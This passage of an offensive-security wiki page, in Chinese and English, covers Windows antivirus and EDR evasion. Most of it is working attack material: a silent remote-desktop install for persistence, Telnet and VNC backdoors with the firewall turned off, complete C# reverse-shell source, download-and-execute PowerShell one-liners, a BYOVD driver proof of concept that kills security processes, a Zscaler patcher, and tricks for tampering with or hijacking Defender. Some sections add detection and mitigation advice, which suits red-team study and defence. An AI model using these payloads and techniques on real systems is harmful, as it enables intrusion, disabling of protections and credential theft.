- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Using Trusted Software

### Chrome Remote Desktop

如 [**这篇博客文章**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) 所述，部署 Chrome Remote Desktop 到受害者的 PC 并利用它接管和维持持久性非常简单：
1. 从 https://remotedesktop.google.com/ 下载，点击 "Set up via SSH"，然后点击 Windows 的 MSI 文件以下载该 MSI。
2. 在受害者机器上静默运行安装程序（需要管理员权限）：`msiexec /i chromeremotedesktophost.msi /qn`
3. 返回 Chrome Remote Desktop 页面并点击下一步。向导将要求你授权；点击 Authorize 按钮继续。
4. 使用稍作调整的参数执行给定命令：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（注意 pin 参数允许不用 GUI 即可设置 PIN）。

## Advanced Evasion

Evasion 是一个非常复杂的话题，有时你需要在单个系统中考虑许多不同的遥测来源，因此在成熟的环境中几乎不可能完全不被发现。

你遇到的每个环境都会有其自身的强项和弱点。

强烈建议你去观看 [@ATTL4S](https://twitter.com/DaniLJ94) 的这场演讲，以便入门更高级的 Evasion 技术。

{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

这也是来自 [@mariuszbit](https://twitter.com/mariuszbit) 的另一场关于 Evasion in Depth 的精彩演讲。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Check which parts Defender finds as malicious**

你可以使用 [**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck)，它会**移除二进制的部分内容**，直到**找出 Defender 认为恶意的那一部分**并向你报告。\
另一款做**同样事情的**工具是 [**avred**](https://github.com/dobin/avred)，其在线服务位于 [**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)

### **Telnet Server**

直到 Windows10 之前，所有 Windows 都附带一个可以安装的 **Telnet server**（需以管理员身份）来进行安装：
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
使其在系统启动时**启动**并立即**运行**：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**更改 telnet 端口** (隐蔽) 并禁用防火墙:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Download it from: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (你应选择 bin downloads，而不是 setup)

**ON THE HOST**：执行 _**winvnc.exe**_ 并配置服务器：

- 启用选项 _Disable TrayIcon_
- 在 _VNC Password_ 中设置密码
- 在 _View-Only Password_ 中设置密码

然后，将二进制文件 _**winvnc.exe**_ 和 **newly** 创建的文件 _**UltraVNC.ini**_ 放入 **victim**

#### **Reverse connection**

The **attacker** should **execute inside** his **host** the binary `vncviewer.exe -listen 5900` so it will be **prepared** to catch a reverse **VNC connection**. 然后，在 **victim** 上：启动 winvnc 守护进程 `winvnc.exe -run` 并运行 `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**WARNING:** 为保持隐蔽，必须避免以下几件事

- 不要在 `winvnc` 已经运行时再次启动它，否则会触发一个 [popup](https://i.imgur.com/1SROTTl.png)。可用 `tasklist | findstr winvnc` 检查是否正在运行
- 不要在没有 `UltraVNC.ini` 放在同一目录下时启动 `winvnc`，否则会导致 [配置窗口](https://i.imgur.com/rfMQWcf.png) 弹出
- 不要运行 `winvnc -h` 获取帮助，否则会触发一个 [popup](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Download it from: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
深入 GreatSCT:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
现在用 `msfconsole -r file.rc` **启动 lister**，并使用以下命令**执行** **xml payload**：
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**当前防护程序会非常快地终止该进程。**

### 编译我们自己的 reverse shell

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 第一个 C# Revershell

使用以下命令编译：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
与之一起使用：
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# 使用编译器
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自动下载并执行：
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# 混淆器列表: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](ps://github.com/l0ss/Group)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### 使用 python 构建注入器示例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### 其他工具
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### 更多

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – 从内核空间终结 AV/EDR

Storm-2603 利用一个名为 **Antivirus Terminator** 的小型控制台工具，在投放勒索软件之前禁用终端防护。该工具携带其**自带的易受攻击但已签名的驱动程序**，并滥用它来发出特权内核操作，即便是 Protected-Process-Light (PPL) 的 AV 服务也无法阻止。

关键要点
1. **已签名的驱动**：写入磁盘的文件是 `ServiceMouse.sys`，但二进制实际上是 Antiy Labs 的 “System In-Depth Analysis Toolkit” 中合法签名的驱动 `AToolsKrnl64.sys`。由于该驱动带有有效的微软签名，即使启用了 Driver-Signature-Enforcement (DSE) 也会被加载。
2. **服务安装**：
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
第一行将驱动注册为 **内核服务**，第二行启动它，从而使 `\\.\ServiceMouse` 在用户态可访问。
3. **驱动导出的 IOCTLs**
| IOCTL code | 功能                              |
|-----------:|-----------------------------------------|
| `0x99000050` | 通过 PID 终止任意进程（用于终止 Defender/EDR 服务） |
| `0x990000D0` | 删除磁盘上的任意文件 |
| `0x990001D0` | 卸载驱动并移除该服务 |

最小化 C 概念验证：
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **为何能奏效**：BYOVD 完全绕过了用户态保护；在内核执行的代码可以打开*受保护*进程、终止它们，或篡改内核对象，而不受 PPL/PP、ELAM 或其他强化机制的限制。

检测 / 缓解
•  启用 Microsoft 的易受攻击驱动阻止列表（`HVCI`, `Smart App Control`），使 Windows 拒绝加载 `AToolsKrnl64.sys`。  
•  监控新的*内核*服务创建，并在驱动从可被全局写入的目录加载或不在允许列表上时发出告警。  
•  观察对自定义设备对象的用户态句柄创建，随后是否有可疑的 `DeviceIoControl` 调用。

### Bypassing Zscaler Client Connector Posture Checks via On-Disk Binary Patching

Zscaler 的 **Client Connector** 在本地应用设备姿态规则，并依赖 Windows RPC 将结果与其他组件通信。两个薄弱的设计选择使完全绕过成为可能：

1. 姿态评估**完全在客户端**进行（只向服务器发送一个布尔值）。  
2. 内部 RPC 端点只验证连接的可执行文件是否**由 Zscaler 签名**（通过 `WinVerifyTrust`）。

通过**在磁盘上修补四个已签名二进制文件**可以中和这两种机制：

| Binary | 被修改的原始逻辑 | 结果 |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 始终返回 `1`，因此所有检查均视为合规 |
| `ZSAService.exe` | 间接调用 `WinVerifyTrust` | 被 NOP 掉 ⇒ 任何（甚至未签名的）进程都可以绑定到 RPC 管道 |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | 被替换为 `mov eax,1 ; ret` |
| `ZSATunnel.exe` | 对隧道的完整性检查 | 被短路 |

最小化补丁程序摘录：
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
在替换原始文件并重启服务堆栈后：

* **所有** posture checks 显示 **绿色/合规**。
* 未签名或被修改的二进制文件可以打开命名管道 RPC 端点（例如 `\\RPC Control\\ZSATrayManager_talk_to_me`）。
* 被入侵的主机将获得由 Zscaler 策略定义的内部网络的无限制访问。

本案例演示了如何仅靠对客户端的信任决策和简单的签名检查可以通过几个字节的补丁被绕过。

## 滥用 Protected Process Light (PPL) 来利用 LOLBINs 篡改 AV/EDR

Protected Process Light (PPL) 强制执行签名者/等级层级，仅允许相同或更高级别的受保护进程相互篡改。从进攻角度看，如果你能够合法地启动一个启用了 PPL 的二进制并控制其参数，就可以将良性功能（例如日志记录）转换为针对 AV/EDR 使用的受保护目录的受限、由 PPL 支持的写入原语。

使进程以 PPL 运行的条件
- 目标 EXE（以及任何加载的 DLL）必须使用具备 PPL 能力的 EKU 签名。
- 进程必须使用 CreateProcess 并使用标志：`EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS` 创建。
- 必须请求与二进制签名者匹配的兼容保护级别（例如，对于反恶意软件签名者使用 `PROTECTION_LEVEL_ANTIMALWARE_LIGHT`，对于 Windows 签名者使用 `PROTECTION_LEVEL_WINDOWS`）。错误的级别会在创建时失败。

另见关于 PP/PPL 和 LSASS 保护的更广泛介绍：

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

启动器工具
- 开源辅助工具: CreateProcessAsPPL（选择保护级别并将参数转发到目标 EXE）:
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)
- 使用模式：
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN primitive: ClipUp.exe
- 签名的系统二进制文件 `C:\Windows\System32\ClipUp.exe` 会自行派生进程，并接受一个参数以将日志文件写入调用者指定的路径。
- 当以 PPL 进程启动时，文件写入会在 PPL 支持下进行。
- ClipUp 无法解析包含空格的路径；使用 8.3 短路径来指向通常受保护的位置。

8.3 short path helpers
- 列出短名称：在每个父目录中运行 `dir /x`。
- 在 cmd 中推导短路径：`for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Abuse chain (abstract)
1) 使用一个启动器（例如 CreateProcessAsPPL），以 `CREATE_PROTECTED_PROCESS` 启动支持 PPL 的 LOLBIN（ClipUp）。
2) 传递 ClipUp 的日志路径参数以强制在受保护的 AV 目录（例如 Defender Platform）中创建文件。如有需要，使用 8.3 短名称。
3) 如果目标二进制文件在运行时通常被 AV 打开/锁定（例如 MsMpEng.exe），通过安装一个能更早可靠运行的自动启动服务，将写入安排在 AV 启动之前的引导阶段。使用 Process Monitor（启动日志）验证引导顺序。
4) 重启后，受 PPL 支持的写入会在 AV 锁定其二进制之前发生，从而损坏目标文件并阻止其启动。

Example invocation (paths redacted/shortened for safety):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Notes and constraints
- 你无法控制 ClipUp 写入的内容，超出放置位置之外；该原语更适合破坏而非精确内容注入。
- 需要本地管理员/SYSTEM 权限来安装/启动服务并需要一个重启窗口。
- 时机至关重要：目标文件不能被打开；引导时执行可避免文件锁定。

Detections
- 进程创建 `ClipUp.exe` 并带有异常参数，尤其父进程由非标准启动器启动，且发生在引导期间。
- 新服务被配置为自动启动可疑二进制并持续在 Defender/AV 之前启动。调查 Defender 启动失败前的服务创建/修改。
- 对 Defender 二进制/Platform 目录进行文件完整性监控；关注带有 protected-process 标志的进程对文件的意外创建/修改。
- ETW/EDR 遥测：查找使用 `CREATE_PROTECTED_PROCESS` 创建的进程以及非-AV 二进制异常使用 PPL 等级的情况。

Mitigations
- WDAC/Code Integrity：限制哪些签名二进制可以作为 PPL 运行以及在何种父进程下运行；阻止在非合法上下文中调用 ClipUp。
- Service hygiene：限制自动启动服务的创建/修改并监控启动顺序的操纵。
- 确保 Defender tamper protection 和早期启动保护已启用；调查指示二进制损坏的启动错误。
- 如果与你的环境兼容，考虑在托管安全工具的卷上禁用 8.3 短文件名生成（需充分测试）。

References for PPL and tooling
- Microsoft Protected Processes overview: https://learn.microsoft.com/windows/win32/procthread/protected-processes
- EKU reference: https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88
- Procmon boot logging (ordering validation): https://learn.microsoft.com/sysinternals/downloads/procmon
- CreateProcessAsPPL launcher: https://github.com/2x7EQ13/CreateProcessAsPPL
- Technique writeup (ClipUp + PPL + boot-order tamper): https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html

## Tampering Microsoft Defender via Platform Version Folder Symlink Hijack

Windows Defender chooses the platform it runs from by enumerating subfolders under:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

It selects the subfolder with the highest lexicographic version string (e.g., `4.18.25070.5-0`), then starts the Defender service processes from there (updating service/registry paths accordingly). This selection trusts directory entries including directory reparse points (symlinks). An administrator can leverage this to redirect Defender to an attacker-writable path and achieve DLL sideloading or service disruption.

Preconditions
- 本地管理员（需要在 Platform 文件夹下创建目录/符号链接(symlinks)）
- 能够重启或触发 Defender 平台重新选择（在启动时重启服务）
- 仅需内置工具（mklink）

Why it works
- Defender 会阻止对其自身文件夹的写入，但其平台选择信任目录项并选择字典序最大的版本，而不会验证目标是否解析到受保护/受信任的路径。

Step-by-step (example)
1) Prepare a writable clone of the current platform folder, e.g. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) 在 Platform 内创建一个指向你文件夹的更高版本目录 symlink：
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) 触发器选择 (建议重启):
```cmd
shutdown /r /t 0
```
4) 验证 MsMpEng.exe (WinDefend) 是否从重定向路径运行：
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
你应该能在 `C:\TMP\AV\` 下观察到新的进程路径，并且服务配置/注册表中会反映该位置。

Post-exploitation options
- DLL sideloading/code execution: 将 Defender 从其应用程序目录加载的 DLL 放置或替换，以便在 Defender 的进程中执行代码。参见上面的章节：[DLL Sideloading & Proxying](#dll-sideloading--proxying)。
- Service kill/denial: 移除 version-symlink，使得下次启动时配置的路径无法解析，导致 Defender 无法启动：
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> 注意：该技术本身不会提供 privilege escalation；需要 admin rights。

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams 可以通过 hook 目标模块的 Import Address Table (IAT)，并将选定的 APIs 路由到攻击者控制的 position‑independent code (PIC)，把 runtime evasion 从 C2 implant 移出到目标模块自身。这样可以将 evasion 泛化到比许多套件暴露的有限 API 面更广的范围（例如 CreateProcessA），并将相同的保护扩展到 BOFs 和 post‑exploitation DLLs。

High-level approach
- 使用 reflective loader（prepended 或 companion）在目标模块旁部署一个 PIC blob。PIC 必须是自包含且 position‑independent 的。
- 当 host DLL 加载时，遍历其 IMAGE_IMPORT_DESCRIPTOR 并修补针对性的 IAT 条目（例如 CreateProcessA/W、CreateThread、LoadLibraryA/W、VirtualAlloc），使其指向精简的 PIC wrappers。
- 每个 PIC wrapper 在尾调用 real API 地址之前执行 evasion。典型的 evasion 包括：
  - 在调用前后对内存进行 mask/unmask（例如，encrypt beacon regions，RWX→RX，修改页面名称/权限），然后在调用后恢复。
  - Call‑stack spoofing：构造一个 benign 的堆栈并切换到目标 API，使得 call‑stack 分析解析为预期的帧。
- 为了兼容性，导出一个接口，以便 Aggressor script（或等效工具）可以注册哪些 APIs 要为 Beacon、BOFs 和 post‑ex DLLs 钩取。

Why IAT hooking here
- 对于任何使用被 hook import 的代码都有效，无需修改工具代码或依赖 Beacon 去代理特定的 APIs。
- 覆盖 post‑ex DLLs：hook LoadLibrary* 可以拦截模块加载（例如 System.Management.Automation.dll、clr.dll），并对它们的 API 调用应用相同的 masking/stack evasion。
- 通过包装 CreateProcessA/W，恢复了对基于 call‑stack 检测的进程生成 post‑ex 命令的可靠使用。

Minimal IAT hook sketch (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
注意事项
- 在 relocations/ASLR 之后并在首次使用 import 之前应用补丁。像 TitanLdr/AceLdr 这样的 reflective loaders 在加载模块的 DllMain 期间演示了 hooking。
- 保持 wrappers 体积小且 PIC‑safe；通过你在打补丁前捕获的原始 IAT 值或通过 LdrGetProcedureAddress 来解析真实的 API。
- 对 PIC 使用 RW → RX 转换，并避免留下 writable+executable 页面。

Call‑stack spoofing stub
- Draugr‑style PIC stubs 构建一个伪造的调用链（返回地址指向良性模块），然后再 pivot 到真实的 API。
- 这可以击败那些期望来自 Beacon/BOFs 到敏感 API 的规范堆栈的检测。
- 与 stack cutting/stack stitching 技术配合使用，以在 API prologue 之前落入期望的帧内。

Operational integration
- 将 reflective loader 前置到 post‑ex DLLs，这样当 DLL 被加载时 PIC 和 hooks 就会自动初始化。
- 使用 Aggressor 脚本注册目标 APIs，使 Beacon 和 BOFs 在无需修改代码的情况下透明地从相同的规避路径中受益。

Detection/DFIR 考量
- IAT integrity：解析到非镜像（heap/anon）地址的条目；对导入指针进行周期性校验。
- Stack anomalies：返回地址不属于已加载镜像；到非镜像 PIC 的突兀跳转；不一致的 RtlUserThreadStart 祖先链。
- Loader telemetry：进程内对 IAT 的写入，修改 import thunks 的早期 DllMain 活动，在加载时创建的意外 RX 区域。
- Image‑load evasion：如果 hook LoadLibrary*，监控与内存掩码事件相关联的 automation/clr assemblies 的可疑加载。

Related building blocks and examples
- Reflective loaders that perform IAT patching during load (e.g., TitanLdr, AceLdr)
- Memory masking hooks (e.g., simplehook) and stack‑cutting PIC (stackcutting)
- PIC call‑stack spoofing stubs (e.g., Draugr)

## SantaStealer 的无文件规避与凭证窃取实战

SantaStealer (aka BluelineStealer) 展示了现代 info‑stealers 如何在单一工作流中融合 AV bypass、anti‑analysis 和 credential access。

### Keyboard layout gating & sandbox delay

- 一个配置标志（`anti_cis`）通过 `GetKeyboardLayoutList` 枚举已安装的键盘布局。如果发现西里尔字母布局，样本会放下一个空的 `CIS` 标记并在运行 stealers 之前终止，确保它在被排除的语言环境中永远不会触发，同时留下狩猎伪迹。
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### 分层 `check_antivm` 逻辑

- 变体 A 遍历进程列表，用自定义滚动校验和对每个名称进行哈希，并将其与嵌入的调试器/沙箱阻止列表进行比较；它还对计算机名重复校验并检查工作目录（例如 `C:\analysis`）。
- 变体 B 检查系统属性（进程数下限、最近在线时间），调用 `OpenServiceA("VBoxGuest")` 检测 VirtualBox 插件，并在 sleep 周期周围进行时间检测以发现单步执行（single-stepping）。任何命中都会在模块启动前中止。

### 无文件辅助器 + 双重 ChaCha20 反射加载

- 主 DLL/EXE 嵌入了一个 Chromium credential helper，它要么被写入磁盘，要么以手动映射方式驻留内存；在 fileless mode 下，它自行解析 imports/relocations，因此不会写入任何 helper 工件。
- 该 helper 存储了第二阶段 DLL，使用 ChaCha20 进行双重加密（两个 32 字节密钥 + 12 字节 nonces）。完成两次解密后，它对该 blob 进行反射加载（不使用 `LoadLibrary`），并调用派生自 [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) 的导出 `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`。
- ChromElevator 例程使用 direct-syscall 反射性 process hollowing 注入到运行中的 Chromium 浏览器，继承 AppBound Encryption 密钥，并直接从 SQLite 数据库解密密码/cookie/信用卡信息，尽管存在 ABE 强化。

### 模块化 in-memory 收集 & 分块 HTTP exfil

- `create_memory_based_log` 遍历全局 `memory_generators` 函数指针表，并为每个启用的模块（Telegram、Discord、Steam、screenshots、documents、browser extensions 等）创建一个线程。每个线程将结果写入共享缓冲区，并在约 45s 的 join 窗口后报告其文件计数。
- 完成后，使用静态链接的 `miniz` 库将所有内容压缩为 `%TEMP%\\Log.zip`。`ThreadPayload1` 然后睡眠 15s，以 10 MB 分块通过 HTTP POST 将归档流式上传到 `http://<C2>:6767/upload`，并伪造浏览器的 `multipart/form-data` 边界（`----WebKitFormBoundary***`）。每个分块附加 `User-Agent: upload`、`auth: <build_id>`、可选的 `w: <campaign_tag>`，最后一个分块追加 `complete: true`，以便 C2 知道重组已完成。

## References

- [Crystal Kit – blog](https://rastamouse.me/crystal-kit/)
- [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [Elastic – Call stacks, no more free passes for malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [Crystal Palace – docs](https://tradecraftgarden.org/docs.html)
- [simplehook – sample](https://tradecraftgarden.org/simplehook.html)
- [stackcutting – sample](https://tradecraftgarden.org/stackcutting.html)
- [Draugr – call-stack spoofing PIC](https://github.com/NtDallas/Draugr)

- [Unit42 – New Infection Chain and ConfuserEx-Based Obfuscation for DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [Synacktiv – Should you trust your zero trust? Bypassing Zscaler posture checks](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [Check Point Research – Before ToolShell: Exploring Storm-2603’s Previous Ransomware Operations](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [Hexacorn – DLL ForwardSideLoading: Abusing Forwarded Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [Windows 11 Forwarded Exports Inventory (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [Microsoft Docs – Known DLLs](https://learn.microsoft.com/windows/win32/dlls/known-dlls)
- [Microsoft – Protected Processes](https://learn.microsoft.com/windows/win32/procthread/protected-processes)
- [Microsoft – EKU reference (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [CreateProcessAsPPL launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [Zero Salarium – Countering EDRs With The Backing Of Protected Process Light (PPL)](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [Zero Salarium – Break The Protective Shell Of Windows Defender With The Folder Redirect Technique](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
